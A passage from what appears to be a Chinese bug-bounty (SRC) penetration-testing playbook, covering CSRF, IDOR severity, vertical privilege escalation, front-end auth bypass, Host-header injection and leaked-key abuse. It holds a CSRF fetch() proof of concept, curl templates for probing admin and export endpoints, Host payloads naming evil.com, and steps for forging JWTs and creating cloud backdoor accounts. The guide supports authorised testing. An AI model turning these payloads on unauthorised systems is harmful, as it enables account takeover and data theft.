fetch('https://target.com/api/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

### 关联漏洞
- OAuth 绑定无 CSRF 保护 → 强制绑定 attacker 账号 → 账户接管 §22
- JSONP + CSRF → 数据窃取 §21
- 结合 Open Redirect → 扩大 CSRF 攻击面 §24

### SRC合规
```
严重度:
  修改密码/支付/绑定 → 高危
  修改一般信息 → 中危
  非敏感操作(退出/搜索/浏览) → 低危/忽略
测试: 仅用自己注册的2个账号验证 CSRF 效果，勿影响线上用户
```

---

# 附录A：IDOR 严重度快速参考

```
Endpoint type determines base severity BEFORE data sensitivity adjustment:

  LIST ENDPOINT (returns all records in one request):
    GET /api/getuserlist → returns ALL users → direct 高危/严重 ✅
    GET /api/user/info (no param, returns all) → same as above
    GET /admin/user/list → direct 高危
    → Single request = full data exposure. No traversal needed.

  SINGLE-RESOURCE ENDPOINT (one ID = one record):
    GET /api/user/info?userId=1001 → need to traverse IDs
    → If IDs are enumerable (sequential/GUID) → 中危/高危
    → If IDs are non-enumerable → 低危/中危

  Key question: "Does ONE request give me all users, or do I need to iterate?"
  One-request-full-list → start at 高危, adjust up for data sensitivity.
```

---

# 附录B：Data-Driven Priority（来自 88,636 WooYun 案例）

| Priority | Vuln Class | Real Cases | Focus |
|----------|-----------|-----------|-------|
| P0 | SQL Injection | 27,732 | Every user-controlled DB input |
| P0 | Unauthorized Access | 14,377 | Every admin/internal endpoint |
| P1 | Logic Flaws | 8,292 | State machines, workflows, business rules |
| P1 | XSS | 7,532 | User content display + input reflection |
| P1 | Info Leak | 7,337 | API responses, error messages, source maps |
| P2 | Command Exec (RCE) | 6,826 | File ops, system calls, template engines |
| P2 | Path Traversal | 2,854 | File download/view, import/export paths |
| P2 | File Upload | 2,711 | Any multipart/form-data endpoint |
| P3 | SSRF | ~2,000 | URL/webhook/callback params |
| P3 | CSRF | ~1,800 | State-changing POST without token |
| P3 | Race Condition | ~1,200 | Coupons, payments, inventory, multi-step ops |

Decision rule: Statistics inform priority, but safety determines order.
Safe-first: IDOR/泛查询/XSS/参数Fuzz first (Phase 3), SQLi/RCE/CMD later (Phase 3.8).

---

## §26 VertPrivEsc（垂直越权 — 专用决策树）

> 垂直越权是贡献最多严重漏洞的阶段——普通用户 Token 访问管理后台 API 可导致全量数据导出、凭证泄露、权限管理失控。

### 识别信号
- 已获取任意有效 Token/JWT/Cookie（普通用户权限）
- 已发现管理相关路径（/admin/ /manage/ /system/ /console/ 等）
- JS 或路由中包含 user/role/perm/config/export/sync 等管理功能关键字

### 决策流程

```
已获取普通用户 Token?
├── 步骤1: 收集管理API清单
│   ├── JS中搜索管理关键字: /admin/ /manage/ /system/ /console/ /boss/ /backend/
│   │   /user/ /role/ /perm/ /config/ /settings/ /export/ /sync/ /audit/ /log/
│   ├── Phase 1 提取的全部API端点中筛选含上述关键字的路径
│   ├── 雪瞳注入结果中的路由，筛选 /manage/* /admin/* 等管理前缀
│   └── 额外关注: 与当前业务领域相关的管理前缀（如 /order-manage/ /member-admin/）
│
├── 步骤2: 逐条测试（用普通用户 Token）
│   ├── 对每个管理端点发请求，附带普通用户 Token
│   ├── 重点优先顺序（按数据泄露风险降序）:
│   │   ├── 导出/下载类: *export*, *download*, *report*, *dump*
│   │   │   → 数据导出（最高危：一次性全量泄露）
│   │   ├── 列表/查询类: *list*, *query*, *search*, *all*
│   │   │   → 全量数据（高危：分页可遍历全量）
│   │   ├── 邮箱/凭证配置类: *email*, *mail*, *smtp*, *config*, *settings*
│   │   │   → 凭证泄露（严重：明文密码/密钥）
│   │   ├── 用户/权限管理类: *user*, *role*, *permission*, *account*
│   │   │   → 权限失控（高危：可创建/修改/删除用户）
│   │   ├── 业务数据类: *personnel*, *staff*, *employee*, *member*, *order*, *finance*
│   │   │   → 敏感业务数据（中危-高危：取决于数据类型）
│   │   └── 写操作类: *update*, *insert*, *create*, *delete*, *remove*, *sync*
│   │       → 数据篡改（高危：可修改/删除数据）
│   └── 方法切换: GET 返回 403 → 换 POST/PUT/PATCH/DELETE
│       部分网关对 GET 有权限控制但对 POST 没有（配置漏洞）
│
├── 步骤3: 如果 Token 能访问管理接口
│   ├── = 垂直越权确认（严重）
│   ├── 立即提取响应中的 total/count/size/summary 判断数据量级
│   ├── 对 export 接口 → 导出文件确认数据泄露量
│   ├── 对响应做敏感字段扫描（password/token/key/secret 等）
│   └── 触发 Phase 3.5: 用管理端点发现的敏感数据回溯其他 Phase
│
└── 步骤4: 如果 GET 全部返回 403
    ├── 尝试移除 Content-Type header
    ├── 尝试不同 Accept headers（application/json vs text/html vs */*）
    ├── 尝试在 POST body 中仅传 {}（有些网关POST不拦截空body）
    ├── 尝试添加 Origin/Referer 为管理后台域名
    └── 记录 "垂直越权已测试，{N}个端点，无发现" 到 findings
```

### Payload 模板（通用参数化）

```
# 批量测试模板（curl）— {TOKEN_HEADER} 替换为实际的 header 名 (token/Authorization/X-Auth-Token)
TOKEN="{YOUR_TOKEN}"

# 类型1: 导出类接口（最高危 — 全量数据一次性导出）
# 对每个发现的 export/download/report 端点:
curl -sk -H "{TOKEN_HEADER}: ${TOKEN}" -X {METHOD} \
  -H "Content-Type: application/json" -d '{}' \
  "https://{TARGET}/{PREFIX}/{EXPORT_ENDPOINT}" -o export_result

# 类型2: 列表类接口（高危 — 检查 total/count 字段）
# 对每个发现的 list/query/search 端点:
curl -sk -H "{TOKEN_HEADER}: ${TOKEN}" -X {METHOD} \
  -H "Content-Type: application/json" \
  -d '{"pageNum":1,"pageSize":5}' "https://{TARGET}/{PREFIX}/{LIST_ENDPOINT}"
# → 关键: 检查响应中的 total/count/size/summary = 全量数据条数

# 类型3: 配置/凭证类接口（严重 — 可能含明文密码/密钥）
# 对每个 config/settings/email/smtp 端点:
curl -sk -H "{TOKEN_HEADER}: ${TOKEN}" -X {METHOD} \
  -H "Content-Type: application/json" -d '{}' \
  "https://{TARGET}/{PREFIX}/{CONFIG_ENDPOINT}"
# → 关键: 检查响应中是否有 password/secret/key/token 字段

# 类型4: 用户/权限管理类接口（高危）
curl -sk -H "{TOKEN_HEADER}: ${TOKEN}" -X {METHOD} \
  -H "Content-Type: application/json" \
  -d '{"pageNum":1,"pageSize":10}' "https://{TARGET}/{PREFIX}/{USER_MANAGE_ENDPOINT}"

# 类型5: 业务数据类接口（中危-高危）
curl -sk -H "{TOKEN_HEADER}: ${TOKEN}" -X {METHOD} \
  -H "Content-Type: application/json" \
  -d '{"pageNum":1,"pageSize":5}' "https://{TARGET}/{PREFIX}/{BUSINESS_DATA_ENDPOINT}"

# 变量替换规则:
# {TARGET} = 目标域名（如 ups.jclps.com）
# {PREFIX} = API前缀（如 orderSystem、api、v1）
# {METHOD} = 从 JS/网络请求中观察到的实际 HTTP 方法（通常POST）
# {TOKEN_HEADER} = 从响应/JS中观察到的实际token header名（token/Authorization/X-Auth-Token）
# {ENDPOINT} = 从 JS/路由/API清单中提取的实际端点路径
```

### 关联漏洞
- 响应敏感内容自动扫描 → Phase 2 Step 0.5
- ACK 自动注入 → Phase 3 Rule 3
- 导出接口检测 → discovery-amplification.md Rule 6

---

## §27 前端鉴权绕过（响应包修改 + JS校验绕过）

### 识别信号
```
两种入口信号（满足任一即进本§）:

信号A — 响应包修改类(场景A-H):
  · API返回正确的数据但前端401弹窗/提示无权限
  · Burp中看到API返回了数据但页面不展示
  · 前端JS中有 if(res.ok) / if(res.status==200) / if(data.success) 校验

信号B — 路由防御类(场景I-L):
  · 点击管理功能点 → 被重定向到登录页或403
  · JS中搜到 beforeEach / beforeEnter / addRoute 等路由守卫代码
  · 已知有 /admin /manage 等路径但登录后访问仍跳转
```

### 核心思路
```
两种绕过路径（根据入口信号选一种）:

路径1 — 改响应包(入口信号A):
  后端没鉴权/鉴权不全,前端自己做了层校验。
  你只需要在Burp中改响应包状态码/字段,让前端展示本不该看到的数据。

路径2 — 路由注入(入口信号B):
  前端路由守卫只在"导航时"拦截,不阻止"已注册路由"。
  找到守卫逻辑漏洞(beforeEach只查login不查role)、
  或直接用router.addRoute()在控制台注入隐藏路由,
  就能让前端渲染你本不该看到的页面。
```

### 路由防御识别（先判断目标用了哪种防御模式）
```
拿到JS源码后,搜以下关键词判断路由防御类型:

搜 routes: [ 或 const routes = [
  → 找到所有静态路由定义(/login /register /404 /admin /dashboard等)
  → 区分: 哪些路径始终可访问(静态),哪些需要权限才显示(动态)
  → 直接浏览器访问所有找到的路径,看哪些不需要登录

搜 beforeEach (全局前置守卫)
  → 分析守卫逻辑: 哪些路径要auth、哪些不要、role检查怎么做的
  → 常见漏洞: 只检查了 isLoggedIn() 没检查角色
  → 常见漏洞: 写了 return 但没阻止导航(return true / undefined 会放行)
  → 常见漏洞: 数组形式的守卫只执行了第一个

搜 addRoute / addRoutes (动态路由注入)
  → 找到"登录后根据权限添加路由"的逻辑
  → 关键: 如果有 convertMenuToRoute 函数 → 分析路径拼接规则
  → 有了规则就能猜: 已知 /dashboard → 拼出 /dashboard-manage /dash/settings

搜 meta.requiresAuth / meta.role / beforeEnter
  → 找出哪些路径标了需要什么角色
  → 如果只标了 requiresAuth: true 没标 role → 登录后就能访问

搜 /api/user/info 或 /api/menuList 或 getMenu (权限菜单接口)
  → 响应里返回 menulist / routes / permissions 数组
  → 如果改响应包里的 menulist → 前端会 addRoute 添加更多路由
```

### 场景判断树
```
发现API返回200但页面不展示数据?

├── 场景A: 状态码校验
│   ├── 后端返回401 → 前端收到就隐藏数据
│   └── Burp将401改成200 → 数据出现 ✅
│
├── 场景B: JSON字段校验
│   ├── 后端返回{"success":false,"code":401,"data":[...]}
│   └── Burp改成{"success":true,"code":200,"data":[...]} → 数据出现 ✅
│
├── 场景C: response.ok校验
│   ├── JS代码: if(res.ok){显示数据}else{弹窗}
│   └── Burp保证响应状态码200+返回数据 → 绕过 ✅
│
├── 场景D: 前端鉴权Token校验
│   ├── JS从localStorage取Token → 没有Token时隐藏/跳转
│   └── 在当前页面注入Token到localStorage → 再刷新页面 → 接口返回正常数据 ✅
│
├── 场景E: 前端路由鉴权
│   ├── Vue/React路由守卫 → 只允许admin角色访问
│   └── 直接curl调用API(绕过前端) → API可能没鉴权 → 数据出现 ✅
│
├── 场景F: 权限菜单响应替换法（垂直越权最聪明的方式）
│   ├── 用管理员账号登录→抓取权限菜单接口的完整响应
│   ├── 把这份完整响应替换给子账号的权限菜单接口
│   ├── 子账号刷新后界面出现所有管理员功能点→直接点击测试
│   └── 如果功能点可访问→垂直越权确认
│       不需要手动猜管理员接口,页面已经全部列出来了
│
├── 场景G: 浏览器回退绕过（自动跳转场景）
│   ├── 登录后页面自动跳转（index→特定页面，一闪而过）
│   ├── 自动跳转走完后→点浏览器左上角回退按钮
│   ├── 利用浏览器缓存+栈结构→回到了跳转前的管理页面
│   └── 此时可能已经是未授权/高权限状态 ✅
│       原理: 跳转脚本已执行完毕,缓存的页面没有再做二次校验
│
└── 场景H: 按钮灰色/未激活 → 直接URL访问绕过UI限制
    ├── 页面上某个按钮灰色不可点(disabled)或提示"未激活"
    ├── 但这种页面通常就是路由层面允许的,只是前端限制了UI入口
    ├── 直接复制当前页面的URL路径,新标签页打开或手动拼接
    └── → 如果路由对你开放 → 绕过前端限制 ✅
        常见: 试用期禁用功能、账号未激活的个人中心、VIP专享页面

发现路由守卫拦截(跳转登录/403)?

├── 场景I: 路由定义搜索 → 从JS源码找到隐藏路径
│   ├── 在JS中搜 path: '/' 和 path: '/xxx' 收集所有路由定义
│   ├── 区分: 静态路由(始终可访问,在routes数组里) vs 动态路由(登录后addRoute)
│   ├── 静态路由 → 直接浏览器URL访问,不需要登录
│   │   常见: 开发时把/admin /manage放在静态路由表里忘了改
│   └── 动态路由 → 找 addRoute 的调用位置 + 分析权限菜单接口响应
│
├── 场景J: beforeEach守卫绕过 → 分析守卫逻辑找漏洞
│   ├── 找到JS中的 beforeEach 函数,看判断逻辑:
│   │   ├── 只检查了token存在性但没校验角色? → 普通用户登录后可访问admin路由
│   │   ├── return 写错了(return undefined / return true 但实际没阻止)?
│   │   ├── 守卫是数组形式但只执行了第一个?
│   │   └── 动态路由添加后 next({...to, replace:true}) 重新触发导航时守卫已过?
│   └── 直接在浏览器控制台调试:
│       localStorage.setItem('token', '任意值')
│       再刷新 → 看守卫是否放行了 /admin 路径
│
├── 场景K: 动态路由手动添加 → 控制台注入路由
│   ├── 原理: 路由守卫只拦截"导航行为",不拦截"已注册路由"
│   ├── 操作: 在浏览器F12控制台执行
│   │   // 找到router实例
│   │   const vm = document.querySelector('#app').__vue_app__
│   │   const router = vm.config.globalProperties.$router
│   │   // 手动添加管理员路由
│   │   router.addRoute({ path: '/admin/users', name: 'admin-users',
│   │     component: () => import('@/views/admin/UserManage.vue') })
│   │   // 导航过去
│   │   router.push('/admin/users')
│   │
│   ├── 如果路由注册成功 → 绕过前端守卫 ✅
│   ├── 找component路径: 在JS源码中搜 views/ 或 pages/ 找已有组件路径
│   └── 配合同源路径推测: 已知 /dashboard → 猜 /dashboard-manage 组件也存在
│
└── 场景L: 路径前缀发现其他角色入口
    ├── 发现 /worker/index → 猜 /admin/index /manage/index 也存在
    ├── 同一个站可能有多套路由表对应不同角色(路径前缀不同)
    ├── 直接浏览器访问 /admin/index → 看路由守卫是否拦截
    └── 如果没拦截 → 垂直越权 ✅
        常见于: 后台管理系统,超级管理员/普通管理员共用一套但前缀不同
```

### 辅助字段速查（改响应包时重点关注）
```
不是所有绕过都是改401→200。以下字段改了可能直接提权:

super_user_force → super_user_true    (管理员权限提升)
isActive:0 → isActive:1               (账号激活绕过)
isShow:0 → isShow:1                   (菜单显示控制)
isAdmin:false → isAdmin:true          (管理员标识)
role:user → role:admin                 (角色提权)
level:0 → level:1                      (权限等级提升)
status:inactive → status:active        (状态绕过)
```

### 找路由+接口技巧（JS源码分析专用）
```
1. 搜路由定义:
   routes: [         → 全部路由路径清单
   path: '/'         → 每条路由的具体路径
   component: () => import → 组件的物理路径(知道路径就能猜其他页面)
   name: 'xxx'       → 路由名称

2. 搜守卫逻辑:
   beforeEach        → 全局前置守卫(鉴权核心逻辑)
   beforeEnter       → 路由独享守卫(特定路径的权限控制)
   meta.requiresAuth → 标记哪些路径需要登录
   meta.role         → 标记哪些路径需要特定角色
   requireAuth       → 守卫函数名

3. 搜动态路由:
   addRoute / addRoutes   → 动态添加路由的位置
   convertMenuToRoute     → 菜单→路由转换函数(暴露路径命名规则)
   filterRoutes / filterAsyncRoutes → 路由过滤函数

4. 搜权限菜单接口:
   getMenu / getRouters / getResource / getPermission
   menuList / menus / authRoutes / permissionList

5. 搜组件路径(知道了就能猜):
   @/views/xxx       → Vue组件路径
   ./pages/xxx       → 小程序/React组件路径
   /components/xxx   → 组件目录

6. 同源功能点推测:
   已知接口 /api/crowd/count_by_condition
   → 猜 /api/crowd/save_by_condition (count→save)
   → 猜 /api/crowd/delete_by_condition (count→delete)
   核心: 操作同一数据的接口名,只有动词不同

7. 反斜杠路径:
   JS里路径写的是 \\log\\ 而不是 /log/
   → 常规搜索搜不到 → 手动构造 /log/ 访问
   → 常见于开发者有意隐藏接口

8. 一个接口泄露全站API清单:
    有些权限/配置接口的响应中会返回所有可用接口的路径+参数
    → 重点查 getRowInfo / getMenu / getResource 等响应
    → 发现了就直接获得全站攻击面

9. 空数据 ≠ 没价值（重要认知）:
    路由接口返回 [] 或 {"data":[]} 时:
    → 接口能访问(无鉴权/鉴权已过) = 攻击面已打开
    → 即使数据为空,返回的JSON结构暴露了:
       字段名(知道对方存了什么数据)
       参数名(知道怎么构造请求)
       可能的枚举值
    → 下一步: 用这些结构信息去猜其他接口是否存在
       返回了 {"users":[]} → 猜 /api/users/create 也存在
       返回了 {"files":[]} → 猜 /api/files/upload 也存在
```

### 决策流程
```
入口判断: 遇到的是哪种信号?

→ 信号A(API有数据但页面不展示):
  Step1: Burp拦截响应 → 看状态码和JSON结构
  Step2: 401/403 → 改成200 | false改true → 放行给前端
  Step3: 数据出现 → 前端鉴权绕过确认 ✅
  Step4: 同时试试curl直接调API → 看后端是不是也没鉴权

→ 信号B(路由跳转登录/403):
  Step1: JS中搜 path: / routes: [ / beforeEach / addRoute
         收集所有路由路径 + 守卫逻辑
  Step2: 浏览器逐个访问发现的路由 → 看哪些不需要登录/角色
  Step3: 分析beforeEach → 找只查login不查role的漏洞
  Step4: 控制台 router.addRoute({path:'/admin/xxx'}) → 手动注入路由
  Step5: 发现 /worker/ 前缀 → 猜 /admin/ 也存在 → 直接访问

→ 自动跳转场景(登录后一闪而过):
  浏览器回退 → 看能否回到高权限页面

→ 按钮灰色场景:
  直接URL访问 → 看路由是否对当前用户开放
```

---

## §28 Host注入与Host碰撞

### SRC 合规边界
```
[SRC ALLOWED] 改Host头看邮件/响应里的链接是否变化、双Host头看是否能绕过代理、
              collaborator OOB回调确认、读取被屏蔽的路径(只读不做修改)
[SRC FORBIDDEN] 点击钓鱼链接、实际重置他人密码、修改他人数据
[SRC CORE] 证明Host头能影响邮件链接/响应URL即可，不需要真的去改别人密码
```

### 识别信号
- 密码重置/找回密码接口（最高频出洞点）
- 发送邮件/验证链接/邀请成员的功能
- 请求中有CDN/代理（有缓存的静态资源）
- 返回403的管理路径（可能被代理屏蔽，Host碰撞绕过）

---

### 场景判断树

```
发现密码重置/发邮件/生成链接类接口?

├── 有"发送重置链接"或"发送验证邮件"功能?
│   └── 改 Host 或 X-Forwarded-Host → 看邮件里的链接域名是否变了
│       [SRC] 用自己的邮箱测试,不需要碰真实用户
│       [SRC] 看到链接变了=漏洞确认,不需要实际点链接重置

├── 有缓存/CDN的静态资源接口?
│   └── 改 X-Forwarded-Host → 看响应URL是否变了 → 可能缓存投毒

├── 后端用Host头做路由转发?
│   └── Host改成内网地址/云元数据 → 看能否访问内部服务 → SSRF via Host

└── 有返回403的管理路径(/actuator /admin /manage)?
    └── 双Host头或绝对路径请求行 → 看能否绕过代理屏蔽
        [SRC] 证明了能绕过代理读到内容即可,不修改内容
```

### 决策流程

```
发现密码重置/发邮件接口?
│
├── Step0: 用自己的邮箱触发一次正常请求,记住响应和邮件内容
│
├── Step1: 改 Host 头(最快出结果,先试)
│   POST /forgot-password HTTP/1.1
│   Host: 你的collaborator域名
│   →
│   ├── collaborator收到回调? → Host注入确认 ✅
│   ├── 邮件里链接域名变了? → Host注入确认 ✅
│   └── 没变化? → 进 Step2
│
├── Step2: 测 X-Forwarded-Host 变体(命中率更高,框架优先取)
│   POST /forgot-password HTTP/1.1
│   X-Forwarded-Host: 你的collaborator域名
│   X-Host: 你的collaborator域名
│   X-Forwarded-Server: 你的collaborator域名
│   Forwarded: host=你的collaborator域名
│   X-HTTP-Host-Override: 你的collaborator域名
│   →
│   ├── 任一命中? → Host注入确认 ✅(框架特性,X头常被忽略)
│   └── 都没变化? → 说明后端校验了Host,此路不通
│
├── Step3 (选做): 如果确认Host注入存在,进一步判断影响范围
│   ├── 密码重置? → 高危(可账户接管)
│   ├── 邮件通知链接? → 中危(可钓鱼)
│   ├── 响应URL变了+有缓存? → 高危(缓存投毒)
│   └── 仅DNS回调但无HTTP跳转? → 低危(只能检测不可利用)
│
├── Step4: 确认后输出证据
│   证据包: 含改过的Host头请求 + collaborator回调截图
│   描述: "目标系统在生成密码重置链接时使用了未校验的Host头,
│          攻击者可构造恶意Host使受害者点击链接时泄露重置Token"
│
└── 关于数据库: [SRC] 不需要落地利用,证明能影响链接即可
```

```
发现403管理路径(垂直越权目标)?

├── Step0: 确认路径确实存在但被屏蔽
│   GET /actuator/heapdump → 403 (Nginx层屏蔽)
│
├── Step1: 双Host头(最常用,先试)
│   GET /actuator/heapdump HTTP/1.1
│   Host: target.com
│   Host: 127.0.0.1
│   →
│   ├── 返回200+数据? → Host碰撞绕过代理确认 ✅
│   │   [SRC] 只读不写,看到内容即可
│   └── 仍403? → 进Step2
│
├── Step2: 绝对路径请求行(第二种手法)
│   GET http://127.0.0.1/actuator/heapdump HTTP/1.1
│   Host: target.com
│   →
│   ├── 200? → Host碰撞确认 ✅
│   └── 仍403? → 换内网IP/端口继续试
│
├── Step3: 批量试内网IP和端口(如果疑心有内网服务)
│   变体Host: localhost, 127.0.0.1, 127.0.0.1:8080, internal-admin.local
│   [SRC] 只测到能访问即停,不需要进一步利用
│
└── Step4: 辅助变体(空格混淆等)
    Host: target.com; Host: 127.0.0.1 (分号绕过)
    Host : target.com (Host后面加空格,部分解析器行为差异)
```

### 变体Header速查

```
框架优先顺序(先测命中率高的):
  Django(lib): X-Forwarded-Host > Host
  Laravel:     X-Forwarded-Host > Host (TrustProxies开启时)
  Spring:      X-Forwarded-Host > Host (ForwardedHeaderFilter开启时)
  Express:     X-Forwarded-Host > Host (trust proxy开启时)
  原始PHP:     $_SERVER['HTTP_HOST'] → 只认Host本身

常用payload清单:
  直接改:  Host: evil.com
  框架:    X-Forwarded-Host: evil.com
  变体1:   X-Host: evil.com
  变体2:   X-Forwarded-Server: evil.com
  变体3:   Forwarded: host=evil.com
  变体4:   X-HTTP-Host-Override: evil.com
  端口:    Host: target.com:evil.com
  子域:    Host: evil.com.target.com (如果校验includes)
  双Host:  Host: target.com + Host: localhost (碰撞用)
  绝对:    GET http://localhost/admin HTTP/1.1 (碰撞用)
```

### 关联漏洞
- 密码重置/认证绕过 → §9
- 403路径未授权 → §8
- SSRF → §6

---

## §29 密钥利用决策树（找到Key后能干什么）

### 核心问题
```
找到一个Key时,不要只问"这个Key能不能直接登录"。
要问"这个Key是用来做什么的"——不同的用途对应不同的利用方式。
```

### 决策流程
```
找到一个密钥(Key/Secret/Token)?

├── Step1: 判断Key的类型
│   ├── 签名Key (用于计算请求签名 x-help-sign / sign / _signature)
│   │   → 你能做: 参数防篡改绕过
│   │   → 以前改参数后端报"签名错误"→ 现在有了Key,改参数后重新算签名就行
│   │   → 直接后果: SQL注入/越权/其他参数篡改不会再被签名拦住
│   │
│   ├── 加密Key (AES/SM4/DES, 用于加解密请求体/响应体)
│   │   → 你能做:
│   │     1. 解密密文: 前端发的加密请求 → 用Key解开 → 看到明文参数
│   │     2. 加密Payload: 把恶意Payload(如SQL注入)加密后发出去
│   │        → WAF只看密文看不懂 → 绕过WAF
│   │
│   ├── JWT Secret (HS256签名密钥)
│   │   → 你能做:
│   │     1. 伪造任意用户JWT: 改payload里 sub/role/name 再重新签名
│   │     2. 用伪造JWT访问所有接口 → 账户接管/垂直越权
│   │
│   ├── 云AK/SK (LTAI/AKIA/AKID + 对应的Secret)
│   │   → 你能做: (见 §19 OSS/Bucket Analysis)
│   │     1. 验证: 调用云API get-caller-identity 确认权限
│   │     2. 列存储桶/下载文件/上传文件
│   │     3. 如果有ECS权限 → 命令执行
│   │     4. 如果有RAM权限 → 创建后门账号
│   │
│   └── Session Key / Cookie加密Key
│       → 你能做:
│         1. 解密Cookie → 看里面存了什么(用户ID/角色/权限)
│         2. 伪造Cookie → 替换用户ID/角色 → 身份冒充
│
├── Step2: 验证Key能用(不是过期/废弃的)
│   ├── 签名Key: 抓一个正常请求 → 改参数值 → 用Key重新算签名 → 发出去看是否成功
│   ├── 加密Key: 抓一个加密请求 → 用Key解密 → 看到了明文 → Key有效
│   ├── JWT Secret: 拿真实JWT → 换payload → 重新签名 → 调接口看是否成功
│   └── 云AK/SK: 调云API → 能调通 → 有效
│
└── Step3: 定级
    ├── 签名Key + 能绕过签名校验改参数 → 高危(配合其他漏洞使用)
    ├── 加密Key + 能解密/加密Payload → 高危(WAF绕过)
    ├── JWT Secret + 能伪造任意用户 → 严重(全量账户接管)
    ├── 云AK/SK + 能访问云资源 → 高危/严重(云环境控制)
    ├── Session Key + 能伪造Cookie → 高危(身份冒充)
    └── Key但无法验证/已过期 → INFO(报告附录A,不入正文)
```

### 使用示例
```
场景: 找到128位AES Key,用在x-help-sign签名上,不能伪造Session
→ 不要下结论"没用了"
→ 判断: 这是签名Key,不是加密Key
→ 操作: 抓一个正常请求 → 改请求参数(比如加SQL注入) → 用Key重算sign
→ 后果: 签名校验不再是障碍

场景: 找到JWT Secret,但发现Session是服务器随机生成的
→ 不要下结论"不能伪造Session"
→ 判断: JWT用来做接口鉴权,Session用来保持登录态
→ 操作: 用JWT Secret伪造一个admin角色的JWT → 直接调管理接口
→ 后果: 垂直越权(不需要管Session)
```